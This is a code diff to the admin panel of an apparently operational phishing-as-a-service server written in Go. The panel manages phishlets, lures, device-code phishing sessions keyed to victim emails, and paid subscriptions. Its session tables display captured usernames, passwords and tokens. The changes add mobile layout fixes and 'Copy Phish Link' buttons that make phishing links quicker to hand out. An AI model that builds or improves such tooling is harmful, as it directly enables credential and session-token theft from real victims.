@@ -24,10 +24,10 @@ h1{color:#e05252;font-size:1.4rem;margin-bottom:4px}
 h2{color:#e0a040;font-size:1.1rem;margin:24px 0 8px;border-bottom:1px solid #222;padding-bottom:6px}
 a{color:#52b0e0;text-decoration:none}a:hover{text-decoration:underline}
 .wrap{max-width:1300px;margin:0 auto;padding:24px 16px}
-.topbar{background:#111;border-bottom:1px solid #2a2a2a;padding:12px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100}
+.topbar{background:#111;border-bottom:1px solid #2a2a2a;padding:12px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100;flex-wrap:wrap}
 .topbar .brand{color:#e05252;font-size:1.1rem;font-weight:bold;letter-spacing:2px}
 .topbar .sub{color:#555;font-size:.82rem}
-.topbar nav{margin-left:auto;display:flex;gap:12px}
+.topbar nav{margin-left:auto;display:flex;gap:12px;flex-wrap:wrap}
 .topbar nav a{color:#888;font-size:.82rem}
 .topbar nav a:hover{color:#e0e0e0}
 .badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:.75rem;font-weight:600}
@@ -42,15 +42,16 @@ a{color:#52b0e0;text-decoration:none}a:hover{text-decoration:underline}
 .stat-box .n.green{color:#4cd44c}
 .stat-box .n.blue{color:#52b0e0}
 .stat-box .l{font-size:.75rem;color:#555;margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
-table{width:100%;border-collapse:collapse;margin-top:6px;font-size:.84rem}
+.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;width:100%}
+table{width:100%;border-collapse:collapse;margin-top:6px;font-size:.84rem;min-width:500px}
 th{background:#161616;color:#666;font-size:.72rem;text-transform:uppercase;letter-spacing:.5px;padding:8px 10px;text-align:left;border-bottom:1px solid #252525}
 td{padding:7px 10px;border-bottom:1px solid #181818;vertical-align:middle}
 tr:hover td{background:#121212}
 .mono{font-family:monospace;font-size:.82rem;color:#aaa}
 .url-cell{font-family:monospace;font-size:.78rem;color:#52b0e0;word-break:break-all;max-width:260px}
 form.inline{display:inline}
-input[type=text],input[type=password],select{background:#171717;border:1px solid #2e2e2e;color:#e0e0e0;padding:6px 10px;border-radius:4px;font-size:.84rem}
-input[type=text]:focus,input[type=password]:focus,select:focus{outline:none;border-color:#484848}
+input[type=text],input[type=password],select,textarea{background:#171717;border:1px solid #2e2e2e;color:#e0e0e0;padding:6px 10px;border-radius:4px;font-size:.84rem}
+input[type=text]:focus,input[type=password]:focus,select:focus,textarea:focus{outline:none;border-color:#484848}
 button,.btn{background:#1e1212;border:1px solid #4a2020;color:#e05252;padding:5px 14px;border-radius:4px;cursor:pointer;font-size:.8rem;text-decoration:none;display:inline-block}
 button:hover,.btn:hover{background:#2a1818;border-color:#7a3333}
 .btn-blue{background:#101820;border-color:#1e4466;color:#52b0e0}
@@ -73,9 +74,36 @@ details>summary{cursor:pointer;color:#52b0e0;font-size:.8rem;padding:4px 0;list-
 details>summary::-webkit-details-marker{display:none}
 details[open]>summary{color:#e0a040}
 pre{background:#0a0a0a;border:1px solid #1e1e1e;padding:10px;border-radius:4px;overflow-x:auto;font-size:.75rem;color:#aaa;white-space:pre-wrap;word-break:break-all}
-.tabs{display:flex;gap:0;border-bottom:1px solid #252525;margin-bottom:16px}
-.tab{padding:8px 18px;cursor:pointer;font-size:.82rem;color:#666;border-bottom:2px solid transparent}
+.tabs{display:flex;gap:0;border-bottom:1px solid #252525;margin-bottom:16px;overflow-x:auto;-webkit-overflow-scrolling:touch}
+.tab{padding:8px 18px;cursor:pointer;font-size:.82rem;color:#666;border-bottom:2px solid transparent;white-space:nowrap}
 .tab.active{color:#e0a040;border-bottom-color:#e0a040}
+@media(max-width:768px){
+  .wrap{padding:12px 8px}
+  .topbar{padding:10px 14px;gap:8px}
+  .topbar .sub{display:none}
+  .topbar nav{margin-left:0;width:100%;gap:8px;font-size:.78rem}
+  .topbar nav a{font-size:.78rem}
+  h1{font-size:1.2rem}
+  h2{font-size:1rem}
+  .stat-box{min-width:calc(50% - 6px);flex:1 1 calc(50% - 6px)}
+  .form-row{flex-direction:column;align-items:stretch}
+  .form-row label{width:auto!important}
+  .form-row input[type=text],.form-row input[type=password],.form-row select,.form-row textarea{width:100%!important;max-width:100%!important}
+  input[type=text],input[type=password],select{width:100%!important;max-width:100%!important}
+  textarea{width:100%!important;max-width:100%!important}
+  .card{padding:10px}
+  table{min-width:420px;font-size:.78rem}
+  th,td{padding:6px 6px}
+  .url-cell{max-width:120px}
+  .chain-box{padding:8px 10px}
+  .section{margin-top:20px}
+  .tabs{flex-wrap:nowrap}
+}
+@media(max-width:480px){
+  .stat-box{min-width:calc(50% - 6px);flex:1 1 calc(50% - 6px);padding:10px 12px}
+  .stat-box .n{font-size:1.5rem}
+  button,.btn{padding:6px 10px;font-size:.78rem}
+}
 `
 
 func panelPage(title, navExtra, body string) string {
@@ -95,12 +123,20 @@ func panelPage(title, navExtra, body string) string {
 </div>
 <div class="wrap">%s</div>
 <script>
-// copy-to-clipboard helper
+// copy-to-clipboard helper (works on mobile too)
 function cp(el){
   var t=el.getAttribute('data-copy');
-  navigator.clipboard&&navigator.clipboard.writeText(t).then(function(){
-    var old=el.textContent;el.textContent='copied!';setTimeout(function(){el.textContent=old},1200);
-  });
+  var done=function(){var old=el.textContent;el.textContent='copied!';setTimeout(function(){el.textContent=old},1400);};
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(t).then(done,function(){fallbackCopy(t,done);});
+  } else { fallbackCopy(t,done); }
+}
+function fallbackCopy(t,cb){
+  var ta=document.createElement('textarea');
+  ta.value=t;ta.style.cssText='position:fixed;left:-9999px;top:-9999px;opacity:0';
+  document.body.appendChild(ta);ta.focus();ta.select();
+  try{document.execCommand('copy');if(cb)cb();}catch(e){}
+  document.body.removeChild(ta);
 }
 </script>
 </body></html>`, title, panelCSS, title, navExtra, body)
@@ -472,7 +508,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		if len(names) == 0 {
 			b.WriteString(`<div class="empty">No phishlets loaded. Add .yaml files to your phishlets directory.</div>`)
 		} else {
-			b.WriteString(`<table><thead><tr>
+			b.WriteString(`<div class="table-wrap"><table><thead><tr>
 <th>Name</th><th>Service</th><th>Hostname</th><th>Unauth URL</th><th>Status</th><th>Actions</th>
 </tr></thead><tbody>`)
 			for _, name := range names {
@@ -536,7 +572,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 					toggleBtn,
 				))
 			}
-			b.WriteString(`</tbody></table>`)
+			b.WriteString(`</tbody></table></div>`)
 		}
 		b.WriteString(`</div>`)
 
@@ -555,7 +591,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		if len(allLures) == 0 {
 			b.WriteString(`<div class="empty">No lures configured yet. Create one above.</div>`)
 		} else {
-			b.WriteString(`<table><thead><tr>
+			b.WriteString(`<div class="table-wrap"><table><thead><tr>
 <th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Assigned User</th><th>Redirect Chain</th><th>Actions</th>
 </tr></thead><tbody>`)
 			for i, l := range allLures {
@@ -671,7 +707,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 					deleteLureBtn,
 				))
 			}
-			b.WriteString(`</tbody></table>`)
+			b.WriteString(`</tbody></table></div>`)
 		}
 		b.WriteString(`</div>`)
 
@@ -707,7 +743,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			if len(ips) == 0 && len(GlobalBlacklist.masks) == 0 {
 				b.WriteString(`<div class="empty">No IPs blocked yet.</div>`)
 			} else {
-				b.WriteString(`<table><thead><tr><th>IP / CIDR</th><th>Type</th><th></th></tr></thead><tbody>`)
+				b.WriteString(`<div class="table-wrap"><table><thead><tr><th>IP / CIDR</th><th>Type</th><th></th></tr></thead><tbody>`)
 				for _, ip := range ips {
 					b.WriteString(fmt.Sprintf(`<tr>
 <td class="mono">%s</td>
@@ -729,7 +765,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 </tr>`, template.HTMLEscapeString(m.mask.String())))
 					}
 				}
-				b.WriteString(`</tbody></table>`)
+				b.WriteString(`</tbody></table></div>`)
 			}
 		}
 		b.WriteString(`</div>`)
@@ -840,9 +876,18 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		previewToken := r.URL.Query().Get("preview")
 		previewBanner := ""
 		if previewToken != "" {
-			previewBanner = fmt.Sprintf(`<div style="background:#1a2a0a;border:1px solid #3a7a1a;border-radius:4px;padding:10px 14px;margin-bottom:10px;font-size:13px;color:#7fcc40">
-DC started — <a href="/dc/preview/%s" target="_blank" style="color:#aad480;font-weight:700">Preview Email →</a> (copy the HTML and send manually)
-</div>`, template.HTMLEscapeString(previewToken))
+			phishLink := "http://" + s.Cfg.GetServerExternalIP() + "/dc/" + previewToken
+			previewBanner = fmt.Sprintf(`<div style="background:#1a2a0a;border:1px solid #3a7a1a;border-radius:4px;padding:12px 14px;margin-bottom:10px;font-size:13px;color:#7fcc40">
+<strong style="color:#aad480">DC Started!</strong><br>
+<div style="margin-top:6px;display:flex;flex-wrap:wrap;gap:8px;align-items:center">
+  <span style="font-family:monospace;font-size:.8rem;color:#ccc;word-break:break-all">%s</span>
+  <button onclick="cp(this)" data-copy="%s" style="background:#1e3a1e;border:1px solid #3a7a1a;color:#7fcc40;padding:3px 10px;border-radius:3px;cursor:pointer;font-size:.78rem">📋 Copy Phish Link</button>
+  <a href="/dc/preview/%s" target="_blank" style="color:#aad480;font-weight:700;font-size:.82rem">Preview Email →</a>
+</div>
+</div>`,
+				template.HTMLEscapeString(phishLink),
+				template.HTMLEscapeString(phishLink),
+				template.HTMLEscapeString(previewToken))
 		}
 		b.WriteString(`<div class="section"><h2>Start DC — No Email (Test Mode)</h2>`)
 		b.WriteString(previewBanner)
@@ -913,9 +958,9 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 		if len(allTargets) == 0 {
 			b.WriteString(`<div class="empty">No device code sessions yet.</div>`)
 		} else {
-			b.WriteString(`<table><thead><tr>
+			b.WriteString(`<div class="table-wrap"><table><thead><tr>
 <th>#</th><th>Email / Tenant</th><th>Code</th><th>Status</th>
-<th>Landing Page</th><th>Started</th><th>Preview / Dashboard</th></tr></thead><tbody>`)
+<th>Phish Link (copy &amp; test)</th><th>Started</th><th>Preview / Dashboard</th></tr></thead><tbody>`)
 			for i := len(allTargets) - 1; i >= 0; i-- {
 				tgt := allTargets[i]
 				status := tgt.GetStatus()
@@ -931,8 +976,15 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 					label = tgt.Tenant
 				}
 				landingURL := baseURL + "/dc/" + tgt.LandingToken
-				landingCell := fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:.75rem">%s</a>`,
-					template.HTMLEscapeString(landingURL), template.HTMLEscapeString("/dc/"+tgt.LandingToken[:8]+"..."))
+				landingCell := fmt.Sprintf(
+					`<div style="display:flex;flex-direction:column;gap:4px">
+<a href="%s" target="_blank" class="mono" style="font-size:.73rem;color:#52b0e0;word-break:break-all">%s</a>
+<button class="btn-gray" style="font-size:.72rem;padding:3px 10px;align-self:flex-start" onclick="cp(this)" data-copy="%s">📋 Copy Link</button>
+</div>`,
+					template.HTMLEscapeString(landingURL),
+					template.HTMLEscapeString(landingURL),
+					template.HTMLEscapeString(landingURL),
+				)
 
 				tgt.mu.Lock()
 				at := tgt.AccessToken
@@ -966,7 +1018,7 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 					tokenCell,
 				))
 			}
-			b.WriteString(`</tbody></table>`)
+			b.WriteString(`</tbody></table></div>`)
 		}
 		b.WriteString(`</div>`)
 
@@ -1020,7 +1072,7 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 		if len(allSubs) == 0 {
 			b.WriteString(`<div class="empty">No subscriptions yet.</div>`)
 		} else {
-			b.WriteString(`<table><thead><tr>
+			b.WriteString(`<div class="table-wrap"><table><thead><tr>
 <th>ID</th><th>Chat ID</th><th>Service</th><th>Status</th><th>TX Hash</th><th>Expires</th><th>Links</th><th>Actions</th>
 </tr></thead><tbody>`)
 			for _, sub := range allSubs {
@@ -1098,7 +1150,7 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 					statusBadge, txCell, expiry, linksCell, actions,
 				))
 			}
-			b.WriteString(`</tbody></table>`)
+			b.WriteString(`</tbody></table></div>`)
 		}
 		b.WriteString(`</div>`)
 	}
@@ -1167,7 +1219,7 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 	if len(lures) == 0 {
 		b.WriteString(`<div class="empty">No lures assigned to your account yet.</div>`)
 	} else {
-		b.WriteString(`<table><thead><tr>
+		b.WriteString(`<div class="table-wrap"><table><thead><tr>
 <th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Chain Links</th>
 </tr></thead><tbody>`)
 		for i, l := range lures {
@@ -1238,7 +1290,7 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 <td>%s</td>
 </tr>`, i, template.HTMLEscapeString(l.Phishlet), lureURLCell, redirectCell, chainCell))
 		}
-		b.WriteString(`</tbody></table>`)
+		b.WriteString(`</tbody></table></div>`)
 	}
 	b.WriteString(`</div>`)
 
@@ -1262,7 +1314,7 @@ func usersTable(userList []*database.User, allLures []*Lure, sessPerUser, tokenP
 		return `<div class="empty">No users yet.</div>`
 	}
 	var b strings.Builder
-	b.WriteString(`<table><thead><tr>
+	b.WriteString(`<div class="table-wrap"><table><thead><tr>
 <th>Username</th><th>Panel URL</th><th>Lures</th><th>Sessions</th><th>Tokens</th><th>Created</th><th></th>
 </tr></thead><tbody>`)
 	for _, u := range userList {
@@ -1298,13 +1350,13 @@ func usersTable(userList []*database.User, allLures []*Lure, sessPerUser, tokenP
 			u.Id,
 		))
 	}
-	b.WriteString(`</tbody></table>`)
+	b.WriteString(`</tbody></table></div>`)
 	return b.String()
 }
 
 func sessionTable(sessions []*database.Session, showDelete bool) string {
 	var b strings.Builder
-	b.WriteString(`<table><thead><tr>
+	b.WriteString(`<div class="table-wrap"><table><thead><tr>
 <th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>Tokens</th><th>Remote IP</th><th>Time</th><th>Detail</th>`)
 	if showDelete {
 		b.WriteString(`<th></th>`)
@@ -1369,7 +1421,7 @@ func sessionTable(sessions []*database.Session, showDelete bool) string {
 		}
 		b.WriteString(`</tr>`)
 	}
-	b.WriteString(`</tbody></table>`)
+	b.WriteString(`</tbody></table></div>`)
 	return b.String()
 }
 
